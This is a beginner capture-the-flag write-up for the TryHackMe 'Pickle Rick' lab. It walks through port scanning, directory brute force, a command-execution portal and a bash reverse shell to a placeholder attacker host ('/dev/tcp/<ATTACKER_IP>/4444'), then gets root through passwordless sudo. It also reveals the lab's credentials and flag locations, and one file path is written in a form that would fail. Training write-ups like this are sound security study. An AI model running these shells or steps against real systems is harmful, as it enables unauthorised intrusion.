# 🥒 Pickle Rick - TryHackMe Writeup

## Overview

Pickle Rick is a beginner-friendly web exploitation machine focused on enumeration, command injection, credential discovery, and basic Linux privilege escalation through misconfigured sudo permissions.

**Difficulty:** Easy

**Topics:**

* Web Enumeration
* Directory Brute Force
* Command Injection
* Reverse Shell
* Linux Privilege Escalation (sudo misconfiguration)

---

## Attack Path

1. Nmap Enumeration
2. Web Application Discovery
3. robots.txt Hint Extraction
4. Hidden Portal Discovery (portal.php)
5. Command Injection (RCE)
6. Reverse Shell Access
7. Privilege Escalation via sudo misconfiguration
8. Root Access
9. Extraction of All Ingredients

---

## Tools Used

* Nmap
* curl
* gobuster / feroxbuster
* netcat
* bash
* Linux commands

---

## Nmap Scan

The first step was performing a full port scan to identify exposed services.

```bash
nmap -sC -sV -p- <TARGET_IP>
```

### Nmap Results

<img width="1308" height="327" alt="image" src="https://github.com/user-attachments/assets/d1deae73-ef73-434d-8ab8-8a54995afa10" />


The scan revealed:

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache 2.4.41
```

The main entry point was the web application running on port 80.

---

## Web Enumeration

Accessing the web application revealed a Rick and Morty themed page.

A hidden username was found in the source code:

```text
R1ckRul3s
```

Further inspection of the application was performed using directory brute force.

### Username Discovery

<img width="1342" height="652" alt="image" src="https://github.com/user-attachments/assets/f54b4d73-1103-41e9-98fc-d0db61388d74" />


```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

---

## robots.txt Analysis

The robots.txt file contained an important hint:

```bash
curl http://<TARGET_IP>/robots.txt
```

```text
Wubbalubbadubdub
```

This string later proved to be useful for accessing restricted functionality.

---

## Hidden Portal Discovery

Directory enumeration revealed a hidden endpoint:

```
/portal.php
```
<img width="1315" height="607" alt="image" src="https://github.com/user-attachments/assets/3c50908e-8581-4ea0-8a28-f20b47dfd3d6" />

This page contained a command execution interface.

---

## Command Injection (RCE)

The portal allowed execution of system commands.

Testing basic commands confirmed execution:

```bash
whoami
```

Output:

```text
www-data
```

This confirmed **Remote Command Execution (RCE)**.

---

## Reverse Shell Access

A reverse shell was established to gain a stable interactive session.

On attacker machine:

```bash
nc -lvnp 4444
```

On target:

```bash
bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"
```

This resulted in:

```text
www-data@ip-10-114-143-61:/var/www/html$
```

---

## Privilege Escalation

After gaining shell access, sudo permissions were checked:

```bash
sudo -l
```

The output revealed:

```text
(ALL) NOPASSWD: ALL
```

This misconfiguration allowed execution of commands as root without authentication.

Root access was obtained using:

```bash
sudo su
```

---

## Ingredients Collection

After escalating privileges, all ingredients were retrieved from the filesystem.

---

### 🥒 1st Ingredient

```bash
cat /var/www/html/Sup3rS3cretPickl3Ingred.txt
```



---

### 🥒 2nd Ingredient

```bash
cat /home/rick/second ingredients
```

---

### 🥒 3rd Ingredient

```bash
cat /root/3rd.txt
```



---

## Conclusion

This machine demonstrated a full web exploitation chain:

1. Web enumeration exposed hidden credentials and hints
2. robots.txt revealed a critical clue
3. Directory brute force uncovered a hidden command execution portal
4. Command injection led to initial shell access
5. Reverse shell provided stable interaction with the system
6. Misconfigured sudo permissions allowed instant privilege escalation to root

---

## Lessons Learned

* Always inspect robots.txt during web enumeration
* Hidden directories are often key entry points in CTF challenges
* Command injection can lead directly to system access
* Reverse shells are essential for stable exploitation
* sudo misconfigurations can result in immediate root compromise
* Full directory enumeration is critical in beginner web machines
